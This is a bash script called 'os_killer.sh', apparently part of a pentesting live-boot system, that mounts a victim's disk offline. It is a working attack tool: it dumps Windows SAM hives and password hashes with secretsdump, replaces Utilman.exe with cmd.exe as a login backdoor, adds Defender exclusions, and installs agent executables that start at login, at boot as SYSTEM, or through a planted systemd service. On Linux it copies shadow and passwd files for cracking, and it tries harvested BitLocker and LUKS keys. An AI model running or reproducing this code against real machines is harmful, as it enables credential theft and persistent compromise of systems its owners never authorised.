#!/bin/bash
# os_killer.sh
# Created on: Sat 29 Jul 2023 08:18:34 PM CEST
#
#  ____   __  ____  __
# (  _ \ /. |(  _ \/  )
#  )___/(_  _))___/ )(
# (__)    (_)(__)  (__)
#
# Description:
#  A script that will let you take a partition mount it and do a few simple
#  attacks on it. For windows partitions it will dump the SAM database to the
#  tmp of the p3ng0s system and will also let you change cmd.exe to utilman.exe.
#  For linux it will allow you to have a copy of etc/shadow and etc/passwd on the
#  tmp of the p3ng0s system and will also allow you to chroot inside of  the system
#  for extra control ^^
# Usage:
#  This script is usually run by .bash_profile during the welcome page of p3ng0s
#  but can be run independantly.

PART=
LOOT_FOLDER=$([ -d /home/p4p1-live/loot ] && echo '/home/p4p1-live/loot' || echo '/tmp')

echo $LOOT_FOLDER

function banner() {
	echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
	echo -e "\e[31m              ( OO ).          \\  ( OO )                              _(  OO)( \\( -O )  \e[0m"
	echo -e "\e[31m .-'),-----. (_)---\_)         ,--. ,--.  ,-.-')  ,--.      ,--.     (,------.,------.  \e[0m"
	echo -e "\e[31m( OO'  .-.  '/    _ |          |  .'   /  |  |OO) |  |.-')  |  |.-')  |  .---'|   /\`. ' \e[0m"
	echo -e "\e[31m/   |  | |  |\\  :\` \`.          |      /,  |  |  \\ |  | OO ) |  | OO ) |  |    |  /  | | \e[0m"
	echo -e "\e[31m\\_) |  |\|  | '..\`''.)  (\`-.   |     ' _) |  |(_/ |  |\`-' | |  |\`-' |(|  '--. |  |_.' | \e[0m"
	echo -e "\e[31m  \\ |  | |  |.-._)   \\ (OO  )_ |  .   \\  ,|  |_.'(|  '---.'(|  '---.' |  .--' |  .  '.' \e[0m"
	echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
	echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
}
function leaver() {
    umount /mnt
    exit 0
}

function linux_hashcat_exp() {
    systemctl stop p3ng0s-cracker-watcher.path
    HASHES=$(grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2)
    [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
    if grep -q '^\w+:\$y\$' /etc/shadow; then
        MODE="28000" # Yescrypt
    else
        MODE="1800"  # SHA-512
    fi
    grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2 > $LOOT_FOLDER/hashcat/hash.$MODE
}

function linux_systemd_infect_exp() {
    [ ! -d /mnt/usr/local/bin ] && mkdir -p /mnt/usr/local/bin
    [ ! -d /mnt/etc/systemd/system/multi-user.target.wants ] && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants/
    cp -r /home/p4p1-live/loot/agent.elf /mnt/usr/local/bin/agent
    chmod +x /mnt/usr/local/bin/agent
    cp -r /etc/p3ng0s/os_killer/infect.service /mnt/etc/systemd/system/infect.service
    ln -sf /etc/systemd/system/infect.service /mnt/etc/systemd/system/multi-user.target.wants/infect.service
}

function linux_exp() {
    while true; do
        SEL=$(dialog --title "What are you looking for?" \
            --menu "...." 20 70 15 \
            1 "dump passwd & shadow" \
            2 "chroot :)" \
            3 "Dump the hashes to then hashcat them ^^" \
            4 "Systemd infect" \
            2>&1 >/dev/tty)
        EXIT_STATUS=$?

        if [ $EXIT_STATUS -ne 0 ]; then
            echo "Exiting..."
            break
        fi

        [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
        [ $SEL = 2 ] && chroot /mnt
        [ $SEL = 3 ] && linux_hashcat_exp
        [ $SEL = 4 ] && linux_systemd_infect_exp
    done

    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
    sleep 1
}

function windows_hashcat_exp() {
    systemctl stop p3ng0s-cracker-watcher.path
    [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
    /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | grep -E '^[^:]+:[^:]+:[^:]+:([a-fA-F0-9]{32}):{3}$' | cut -d: -f4 > $LOOT_FOLDER/hashcat/hash.1000
}

function windows_exclusion_path_exp() {
    mkdir -p /mnt/Windows/Tasks/p3ng0s/
    hivexregedit --merge "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/defender_exclude_persistence.reg
}

function windows_user_login_exp() {
    if [ ! -f /home/p4p1-live/loot/agent.exe ]; then
        echo -e "\e[1;31m[!]\e[m No agent.exe found at /home/p4p1-live/loot/agent.exe! Cannot proceed"
        return 1
    fi
    [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
    cp /home/p4p1-live/loot/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
    hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SOFTWARE' "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/exe_on_user_login.reg
}

function windows_boot_service_exp() {
    if [ ! -f /home/p4p1-live/loot/agent.svc.exe ]; then
        echo -e "\e[1;31m[!]\e[m No agent.svc.exe found at /home/p4p1-live/loot/agent.svc.exe! Cannot proceed"
        return 1
    fi
    [ ! -d /mnt/Windows/Tasks/p3ng0s/ ] && mkdir -p /mnt/Windows/Tasks/p3ng0s/
    cp /home/p4p1-live/loot/agent.svc.exe /mnt/Windows/Tasks/p3ng0s/agent.svc.exe
    hivexregedit --merge --prefix='HKEY_LOCAL_MACHINE\SYSTEM' "/mnt/Windows/System32/config/SYSTEM" /etc/p3ng0s/os_killer/service_start_on_boot.reg
}

function windows_exp() {
    while true; do
        SEL=$(dialog --title "What are you looking for?" \
            --menu "...." 20 70 15 \
            1 "Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
            2 "Swap cmd.exe and utilman.exe" \
            3 "Secrets dump me baby right now" \
            4 "Dump the hashes to then hashcat them ^^" \
            5 "Create defender exclusion path in C:\\Windows\\Tasks\\p3ng0s\\" \
            6 "Install agent.exe to run on user login" \
            7 "Install agent.svc.exe to run on boot as NT Authority/System" \
            2>&1 >/dev/tty)
        EXIT_STATUS=$?

        if [ $EXIT_STATUS -ne 0 ]; then
            echo "Exiting..."
            break
        fi

        [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
        [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
        [ $SEL = 3 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
        [ $SEL = 4 ] && windows_hashcat_exp
        [ $SEL = 5 ] && windows_exclusion_path_exp
        [ $SEL = 6 ] && windows_user_login_exp
        [ $SEL = 7 ] && windows_boot_service_exp
    done

    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
    sleep 1
}

function select_os() {
    mount $PART /mnt
    [ $? -ne 0 ] && $(sleep 4;exit -1)
    OS_SEL=$(dialog --title "Select a operating system" \
        --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
        1 "Windows" \
        2 "Linux" \
        2>&1 >/dev/tty)
    [ $OS_SEL = 1 ] && windows_exp
    [ $OS_SEL = 2 ] && linux_exp
}

function encryption_check() {
    DEV=$PART
    TYPE=$(blkid -s TYPE -o value $DEV)
    if [[ "$TYPE" == "bitlocker" ]]; then
        echo "[!] BitLocker detected on $DEV"
        # Try keys from file first
        if [[ -f "/home/p4p1-live/loot/bitlocker.txt" ]]; then
            while IFS= read -r key || [[ -n "$key" ]]; do
                [[ -z "$key" || "$key" =~ ^# ]] && continue
                echo "Trying recovery key: $key"
                echo "$key" | cryptsetup open --type bitlocker "$DEV" unlock &>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "[+] BitLocker unlocked with key from file!"
                    PART=/dev/mapper/unlock
                    echo "/dev/mapper/unlock"
                    return 0
                fi
            done < /home/p4p1-live/loot/bitlocker.txt
        fi
        # Prompt if file keys fail
        echo "[-] Recovery keys from file failed or not found."
        read -s -p "Enter BitLocker Recovery Key or Password: " user_pass
        echo
        echo "$user_pass" | cryptsetup open --type bitlocker "$DEV" unlock
        if [[ $? -eq 0 ]]; then
            PART=/dev/mapper/unlock
            echo "/dev/mapper/unlock"
            return 0
        else
            echo "[!] Failed to unlock BitLocker. Exiting."
            sleep 1
            exit 1
        fi
    elif [[ "$TYPE" == "crypto_LUKS" ]]; then
        echo "[!] Crypto LUKS detected on $DEV"
        # Try passwords from file
        if [[ -f "/home/p4p1-live/loot/luks.txt" ]]; then
            while IFS= read -r pass || [[ -n "$pass" ]]; do
                [[ -z "$pass" || "$pass" =~ ^# ]] && continue
                echo -n "$pass" | cryptsetup open "$DEV" unlock &>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo "[+] LUKS unlocked with password from file!"
                    PART=/dev/mapper/unlock
                    echo "/dev/mapper/unlock"
                    return 0
                fi
            done < /home/p4p1-live/loot/luks.txt
        fi

        # Prompt if file passwords fail
        echo "[-] LUKS passwords from file failed."
        read -s -p "Enter LUKS Passphrase: " user_pass
        echo
        echo -n "$user_pass" | cryptsetup open "$DEV" unlock
        if [[ $? -eq 0 ]]; then
            echo "/dev/mapper/unlock"
            PART=/dev/mapper/unlock
            return 0
        else
            echo "[!] Failed to unlock LUKS. Exiting."
            exit 1
        fi
    fi
}

function list_hard_drives() {
    partitions=$(lsblk -npo NAME,SIZE --sort SIZE | tac)
    partition_options=()
    while read -r name size; do
        partition_options+=( "$name" "$name ($size)" )
    done <<< "$partitions"
    selected_partition=$(dialog --title "Select a Partition" \
                                 --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
                                 "${partition_options[@]}" \
                                 2>&1 >/dev/tty)
    if [[ -z "$selected_partition" ]]; then
        echo -e "\e[1;31m[!]\e[m No partition selected. Exiting.. ^^"
        exit 0
    fi
    PART=$selected_partition
}

if [ "$EUID" -ne 0 ]; then
    banner
    echo -e "\e[1;31m[!]\e[m Please enter the root password (default: p4p1)"
    exec sudo bash "$0" "$@"
else
    export DIALOGRC="/etc/p3ng0s/dialogrc"
    list_hard_drives
    encryption_check
    select_os
fi

umount /mnt
echo -e "\e[1;32m[*]\e[m you will now be booting in the gui environement if run at startup ^^"
sleep 5
exit
